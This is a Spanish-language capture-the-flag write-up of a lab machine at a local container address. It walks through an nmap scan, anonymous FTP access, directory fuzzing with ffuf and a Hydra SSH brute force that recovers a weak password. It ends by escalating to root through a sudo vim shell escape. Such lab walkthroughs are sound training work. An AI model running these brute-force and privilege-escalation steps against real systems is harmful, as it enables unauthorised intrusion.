
## Escaneo de Puertos

Empezamos haciendo un escaneo con **nmap** como de costumbre para ver que puertos tenemos abiertos y que **servicios** corren en ellos.
```
[11:22:20] bapee@BlumeSec ~/obbs ❯ nmap -sVC -p- --open 172.17.0.2
```
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0             667 Jun 18  2024 chat-gonza.txt
|_-rw-r--r--    1 0        0             315 Jun 18  2024 pendientes.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.17.0.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 60:05:bd:a9:97:27:a5:ad:46:53:82:15:dd:d5:7a:dd (ECDSA)
|_  256 0e:07:e6:d4:3b:63:4e:77:62:0f:1a:17:69:91:85:ef (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Russoski Coaching
MAC Address: 1A:B9:03:EC:F0:C4 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## Análisis de puertos:

Como vemos tenemos varias cosas interesantes, el puerto 21/FTP (File Transfer Protocol) esta abierto, tiene **2 archivos compartidos** y también el usuario **Anonymous "allowed"**, esto nos deja entrar dentro del servicio sin tener que autenticarnos a través de este usuario

También vemos el puerto **80/Apache** que por ahora vamos a dejar en espera porque primero analizaremos el FTP.

Y el puerto 22/SSH como de costumbre, seguro que luego nos sirve para algo.
## Conexión con FTP:

Vamos a entrar por el puerto FTP con el siguiente comando.
```bash
[11:22:40] bapee@BlumeSec ~/obbs ❯ ftp 172.17.0.2
Connected to 172.17.0.2.
220 (vsFTPd 3.0.5)
Name (172.17.0.2:bapee): Anonymous <-- "Aqui introducimos el user"
331 Please specify the password.
Password: <-- "No ponemos contraseña"
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> <-- "Accedimos al servicio FTP"
```

Ahora listamos para ver que hay dentro "Aunque ya lo sabemos, no esta de mas revisar".
```bash
ftp> dir
229 Entering Extended Passive Mode (|||45396|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             667 Jun 18  2024 chat-gonza.txt
-rw-r--r--    1 0        0             315 Jun 18  2024 pendientes.txt
226 Directory send OK.
```

Vemos los 2 archivos de texto, como nos interesan con "get" los vamos a traer al directorio actual de nuestra maquina.
```bash
ftp> get chat-gonza.txt
local: chat-gonza.txt remote: chat-gonza.txt
229 Entering Extended Passive Mode (|||61565|)
150 Opening BINARY mode data connection for chat-gonza.txt (667 bytes).
100% |************************************************************************************|   667       12.23 MiB/s    00:00 ETA
226 Transfer complete.
667 bytes received in 00:00 (2.53 MiB/s)
ftp> get pendientes.txt
local: pendientes.txt remote: pendientes.txt
229 Entering Extended Passive Mode (|||54956|)
150 Opening BINARY mode data connection for pendientes.txt (315 bytes).
100% |************************************************************************************|   315        8.83 MiB/s    00:00 ETA
226 Transfer complete.
315 bytes received in 00:00 (1.05 MiB/s)
ftp> exit
```

Vamos a leer que pone en los archivos.
```bash
[11:39:03] bapee@BlumeSec ~/obbs ❯ sudo cat chat-gonza.txt
[16:21, 16/6/2024] Gonza: pero en serio es tan guapa esa tal Nágore como dices?
[16:28, 16/6/2024] Russoski: es una auténtica princesa pff, le he hecho hasta un vídeo y todo, lo tengo ya subido y tengo la URL guardada
[16:29, 16/6/2024] Russoski: en mi ordenador en una ruta segura, ahora cuando quedemos te lo muestro si quieres
[21:52, 16/6/2024] Gonza: buah la verdad tenías razón eh, es hermosa esa chica, del 9 no baja
[21:53, 16/6/2024] Gonza: por cierto buen entreno el de hoy en el gym, noto los brazos bastante hinchados, así sí
[22:36, 16/6/2024] Russoski: te lo dije, ya sabes que yo tengo buenos gustos para estas cosas xD, y sí buen training hoy

[11:39:05] bapee@BlumeSec ~/obbs ❯ sudo cat pendientes.txt 
1 Comprar el Voucher de la certificación eJPTv2 cuanto antes!

2 Aumentar el precio de mis asesorías online en la Web!

3 Terminar mi laboratorio vulnerable para la plataforma Dockerlabs!

4 Cambiar algunas configuraciones de mi equipo, creo que tengo ciertos
  permisos habilitados que no son del todo seguros..
[11:39:11] bapee@BlumeSec ~/obbs ❯ 
```

Después de analizar los archivos, vemos 2 cosas, tenemos usuarios llamados "Gonza" y "Russoski", ellos tienen una conversación donde hablan de una chicha y su entreno en el gimnasio.

En el siguiente archivos vemos una lista de tareas que tienen pendientes, vamos a revisar la web a ver que vemos.

## Análisis de la Web:

Después de revisar la web atentamente me decido a hacer un **ffuf** a ver que encontramos.
```bash
ffuf -u http://172.17.0.2/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r
```
```bash
backup         [Status: 200, Size: 937, Words: 63, Lines: 17, Duration: 1ms]
important      [Status: 200, Size: 947, Words: 61, Lines: 17, Duration: 1ms]
```

Vemos que hay 2 pistas mas, asi que vamos a analizarlas!
Descubro que nos lleva a backup.txt y con un curl analizo su contenido
```bash
[12:04:46] bapee@BlumeSec ~/obbs ❯ curl 172.17.0.2/backup/backup.txt
Usuario para todos mis servicios: russoski (cambiar pronto!)
```

Visto esto, vamos a proceder a intentar conectarnos por SSH.

## Acceso SSH:

Hacemos fuerza bruta con hydra a ssh.
```bash
hydra -l russoski -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4
```
```bash
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-20 12:14:40
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[STATUS] 76.00 tries/min, 76 tries in 00:01h, 14344323 to do in 3145:42h, 4 active
[22][ssh] host: 172.17.0.2   login: russoski   password: iloveme
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-20 12:16:14
```

Conseguimos la contraseña del servicio **ssh**: "**iloveme**", asi que ahora vamos a acceder a ver que nos encontramos.
```bash
[12:20:52] bapee@BlumeSec ~/obbs ❯ ssh russoski@172.17.0.2
russoski@172.17.0.2s password: 
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.19.14+kali-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Tue Jun 18 04:38:10 2024 from 172.17.0.1
russoski@1b213b0de564:~$ <-- "Estamos dentro"
```

## Escalada de privilegios:

Vamos a probar a hacer "sudo -l" para intentar escalar a root.
```bash
russoski@1b213b0de564:~$ sudo -l
Matching Defaults entries for russoski on 1b213b0de564:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User russoski may run the following commands on 1b213b0de564:
    (root) NOPASSWD: /usr/bin/vim
russoski@1b213b0de564:~$ 
```

Viendo que podemos escalar usando vim, con el siguiente comando conseguiremos acceso a root.
```bash
russoski@1b213b0de564:~$ sudo /usr/bin/vim -c ':!/bin/bash'
```
```bash
root@1b213b0de564:/home/russoski# whoami
root
root@1b213b0de564:/home/russoski# id
uid=0(root) gid=0(root) groups=0(root)
root@1b213b0de564:/home/russoski# cd /root
root@1b213b0de564:~# ls
Video-Nagore-Fernandez.txt
root@1b213b0de564:~# 
```

Una vez hecho esto, ya tenemos la maquina vulnerada!

## Resumen del ataque

1. Se realizó un reconocimiento inicial con Nmap para identificar los servicios expuestos en la máquina objetivo.
2. Durante el escaneo se detectó un servicio FTP con acceso anónimo habilitado, lo que permitió descargar varios archivos de texto con información sensible y posibles pistas sobre usuarios del sistema.
3. Tras analizar los archivos obtenidos, se identificó el usuario `russoski` y se descubrieron referencias a configuraciones inseguras y recursos almacenados en el servidor.
4. Posteriormente se realizó una fase de enumeración web utilizando ffuf, encontrando directorios ocultos accesibles desde el servidor Apache.
5. Uno de los recursos descubiertos reveló que el usuario `russoski` era utilizado en todos los servicios del sistema.
6. Con esta información se ejecutó un ataque de fuerza bruta contra el servicio SSH mediante Hydra, obteniendo credenciales válidas de acceso.
7. Tras acceder al sistema por SSH, se revisaron los privilegios sudo del usuario y se comprobó que podía ejecutar `vim` como root sin necesidad de contraseña.
8. Finalmente, aprovechando esta mala configuración de privilegios y utilizando una técnica de escalada conocida en GTFOBins sobre Vim, se obtuvo una shell con privilegios de root, comprometiendo completamente la máquina.






